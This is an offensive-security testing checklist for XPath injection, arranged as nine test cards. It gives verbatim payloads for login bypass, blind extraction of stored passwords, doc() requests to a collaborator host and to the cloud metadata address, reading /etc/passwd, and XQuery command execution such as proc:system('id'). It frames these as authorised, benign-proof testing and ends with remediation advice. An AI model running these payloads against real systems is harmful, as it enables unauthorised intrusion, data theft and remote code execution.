# XPath Injection — Checklist

Expert per-attack **test-case matrix** for XPath Injection — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*9 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## XPATH-001 — Find &amp; fingerprint the XPath sink
**Test Category:** Recon &amp; Fingerprint · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** XML login, native XML DB (BaseX/eXist/MarkLogic), SAML, XML config, SOAP/XSLT

**Test Steps:** 1. Locate the XPath sink (XML-backed login, native XML DB, SAML, config, SOAP/XSLT).<br>2. Fingerprint the version: 1.0 vs 2.0/3.0 (does string-length/lower-case/doc work?) vs XQuery (FLWOR).<br>3. Identify the injection context: single-quote / double-quote string / numeric / path. Note the native XML DB if any.

**Expected Result:** The sink, XPath version, context, and any native XML DB are identified.

**Payload Example:**

```
does doc()/string-to-codepoints() work? -> 2.0 ; context = single-quote string
```

**Impact:** Version decides available functions (doc/unparsed-text = 2.0); context decides the breakout.

**Tools:** Burp Repeater

**References:** CWE-643; OWASP Testing Guide: XPath Injection (WSTG-INPV-09)

---

## XPATH-002 — Detection — quote/error + boolean control
**Test Category:** Detection · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Any XPath-reaching parameter

**Test Steps:** 1. Quote/error probes: ' " ] ) '" -&gt; note any XPath/XML error leak.<br>2. Boolean TRUE (' or '1'='1) vs FALSE (' or '1'='2) -&gt; a DIFF (not just an error) confirms injection.<br>3. Try both ' and " contexts; numeric/position (1 or 1=1) where applicable.

**Expected Result:** TRUE and FALSE payloads produce a stable response difference.

**Payload Example:**

```
' or '1'='1  vs  ' or '1'='2  ; numeric: 1 or 1=1
```

**Impact:** Confirms the query interprets your XPath - the core primitive.

**Tools:** Burp Repeater

**References:** CWE-643; PortSwigger Web Security Academy: XPath injection

---

## XPATH-003 — Authentication bypass
**Test Category:** Auth Bypass · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** XML-backed login (username/password)

**Test Steps:** 1. Inject the LAST field (password) so the OR escapes the AND: password = ' or '1'='1  -&gt;  ...and password='' or '1'='1' = TRUE (reliable full bypass).<br>2. In the USERNAME field, plain ' or '1'='1 often FAILS - XPath 'and' binds TIGHTER than 'or', so it parses username='' or ('1'='1' and password='x') = false; use a bare-true middle term instead: ' or 1=1 or ''='  (escapes the AND), or inject BOTH fields.<br>3. Union node-set breakout ']|//user|//a[' restructures the node-set (precedence-proof); admin' or 1=1 or ''=' to target admin. CONFIRM: logged in with NO valid password, fresh session, expected/admin user.

**Expected Result:** You are authenticated without a valid password, as the intended/admin user.

**Payload Example:**

```
password=' or '1'='1 ; user=' or 1=1 or ''=' ; ']|//user|//a['
```

**Impact:** Full authentication bypass / admin login - Critical.

**Tools:** Burp Repeater

**References:** CWE-643; CWE-287; PortSwigger Web Security Academy: XPath injection

---

## XPATH-004 — Blind extraction (char-by-char -&gt; full dump)
**Test Category:** Blind Extraction · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** A boolean oracle (login / record present / status / length)

**Test Steps:** 1. Record/field counts: count(//user)=N ; count(//user[1]/*)=M.<br>2. Length: string-length((//user[1]/password))=L.<br>3. Char-by-char: substring((//user[1]/password),i,1)='c' ; codepoint binary-search (2.0) for speed; name() for element discovery. Extract a marker/own record, then the whole store is demonstrable.

**Expected Result:** The oracle reveals field structure and secret values character by character.

**Payload Example:**

```
' or substring((//user[1]/password),1,1)='a' or 'x'='y ; ' or count(//user)=5 or 'x'='y
```

**Impact:** Full XML store dump (credentials/PII) - High/Critical.

**Tools:** Burp Intruder, poc script

**References:** CWE-643; HackTricks: XPATH injection

---

## XPATH-005 — Error-based extraction
**Test Category:** Extraction · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Sinks with verbose XPath/XML errors

**Test Steps:** 1. Craft payloads that force the value into an error message.<br>2. Verbose errors leak node values directly (faster than blind).<br>3. Read the leaked value from the error.

**Expected Result:** Target values appear inside XPath/XML error messages.

**Payload Example:**

```
cast/invalid-function payloads that echo the node value in the error
```

**Impact:** Faster full disclosure via error leakage - High.

**Tools:** Burp Repeater

**References:** CWE-643; HackTricks: XPATH injection

---

## XPATH-006 — XPath 2.0 doc() SSRF &amp; unparsed-text() file read
**Test Category:** 2.0/3.0 — SSRF/File · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L)

**Where to Test / Injection Point:** XPath 2.0/3.0 sinks

**Test Steps:** 1. doc('http://$COLLAB') -&gt; SSRF/OOB fetch confirmed (own OOB).<br>2. doc('http://169.254.169.254/...') -&gt; cloud metadata / internal (hand to SSRF kit).<br>3. unparsed-text('file:///etc/passwd') -&gt; local file read. One benign proof.

**Expected Result:** doc() fetches your URL/metadata and/or unparsed-text() reads a local file.

**Payload Example:**

```
doc('http://$COLLAB/x') ; unparsed-text('file:///etc/passwd')
```

**Impact:** SSRF -&gt; cloud metadata / local file read - High/Critical.

**Tools:** interactsh, Burp

**References:** CWE-643; CWE-918; HackTricks: XPATH injection

---

## XPATH-007 — XQuery extension-function RCE
**Test Category:** XQuery — RCE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Native XML DBs (BaseX / MarkLogic / eXist-db)

**Test Steps:** 1. BaseX proc:system('id') ; MarkLogic xdmp:* ; eXist util:eval.<br>2. FLWOR expressions to run the extension function.<br>3. One benign command (id/whoami), then STOP.

**Expected Result:** An XQuery extension function executes your benign command.

**Payload Example:**

```
BaseX: proc:system('id') ; eXist: util:eval('...')
```

**Impact:** RCE via XQuery extension functions - Critical.

**Tools:** Burp Repeater

**References:** CWE-652; CWE-643; CWE-94; HackTricks: XPATH injection

---

## XPATH-008 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: a lone '/error with no steered behavior change; ' or '1'='1 returning 200 with no diff vs the ' or '1'='2 control; login 'works' only in your own session; a reflected count()/value with no oracle effect; 'app uses XML' with no injecting parameter.<br>2. REQUIRE: a steered, repeatable change (bypass / dump / file / RCE), baselined against a control.

**Expected Result:** Only control-baselined, steered candidates survive.

**Payload Example:**

```
lone error = not a finding ; no diff vs FALSE control = FP ; reflected value = no oracle
```

**Impact:** Protects credibility; XPath is dense with lone-error false positives.

**Tools:** manual

**References:** CWE-643; PortSwigger Web Security Academy: XPath injection

---

## XPATH-009 — Client-facing impact &amp; SAFE PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with impact (RCE &gt; file read/SSRF &gt; full dump &gt; auth bypass).<br>2. Provide the payload, the TRUE-vs-FALSE control, and the concrete proof (logged-in session / extracted marker / doc() OOB hit / benign command).<br>3. Set CVSS 3.1 + CWE-643 (CWE-652 for XQuery). Remediation: parameterize XPath (precompiled expressions / variable binding), never concatenate user input, validate/encode, disable doc()/external functions, least-privilege XML DB.<br>4. Own account, stop extraction once proven, benign doc()/file, one XQuery command then STOP; de-dupe.

**Expected Result:** A reproducible, correctly-rated, safe PoC with clear remediation.

**Payload Example:**

```
PoC: payload + true/false control + concrete proof + CVSS + CWE-643 + remediation.
```

**Impact:** Converts the steered change into a defensible Critical/High report.

**Tools:** CVSS calculator, XPATH_REPORT_TEMPLATE.md

**References:** CWE-643; CWE-652; FIRST CVSS v3.1; OWASP Testing Guide: XPath Injection (WSTG-INPV-09)  |  TOP REFERENCES: OWASP XPath Injection; PayloadsAllTheThings; HackTricks; Black Hat blind XPath research (Klein)

---
